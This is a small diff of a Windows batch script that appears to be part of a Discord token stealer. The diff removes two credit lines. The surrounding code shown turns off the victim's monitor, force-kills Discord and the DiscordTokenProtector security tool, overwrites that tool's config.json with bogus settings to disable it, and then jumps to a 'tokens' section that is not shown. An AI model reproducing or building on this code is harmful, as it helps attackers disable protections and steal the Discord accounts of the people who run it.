@@ -64,7 +64,6 @@ goto discordkill
 :discordkill
 powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
 
-::credits to baum for this make sure to check out his github
 taskkill /im Discord.exe /f
 taskkill /im DiscordTokenProtector.exe /f
 cls
@@ -87,7 +86,6 @@ echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProte
 echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 cls
 goto tokens
 
